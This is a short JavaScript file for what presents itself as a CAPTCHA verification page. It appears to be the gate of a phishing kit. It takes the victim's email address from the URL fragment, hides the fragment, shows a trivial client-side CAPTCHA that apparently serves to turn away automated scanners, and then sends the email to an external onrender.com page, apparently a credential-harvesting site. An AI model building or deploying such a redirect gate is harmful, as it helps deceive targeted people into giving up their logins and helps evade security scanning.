function generateSecureToken(length = 64) {
  const array = new Uint8Array(length / 2);
  window.crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

function generateSimpleCaptcha() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
  let captcha = "";
  for (let i = 0; i < 6; i++) {
    captcha += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return captcha;
}

window.onload = function () {
  const hash = window.location.hash.substring(1);
  if (hash && hash.includes("@")) {
    sessionStorage.setItem("redirect_email", hash);
    sessionStorage.setItem("redirect_token", generateSecureToken());
    sessionStorage.setItem("captcha_text", generateSimpleCaptcha());
    history.replaceState(null, "", window.location.pathname);
  }
  
  // Display the CAPTCHA
  const captchaText = sessionStorage.getItem("captcha_text");
  document.getElementById("captchaText").textContent = captchaText;
};

function onVerify() {
  const captchaText = sessionStorage.getItem("captcha_text");
  const userInput = document.getElementById("captchaInput").value.trim();
  
  if (!userInput) {
    alert("Please enter the CAPTCHA text.");
    return;
  }
  
  if (userInput !== captchaText) {
    alert("CAPTCHA verification failed. Please try again.");
    // Generate new CAPTCHA
    sessionStorage.setItem("captcha_text", generateSimpleCaptcha());
    document.getElementById("captchaText").textContent = sessionStorage.getItem("captcha_text");
    document.getElementById("captchaInput").value = "";
    return;
  }

  const email = sessionStorage.getItem("redirect_email");
  const token = sessionStorage.getItem("redirect_token");

  if (email && token) {
    const url = `https://ronnicf-github-io.onrender.com/adb.html#${email}&token=${token}`;
    window.location.href = url;
  } else {
    alert("Session expired or invalid. Please reload the page.");
  }
}
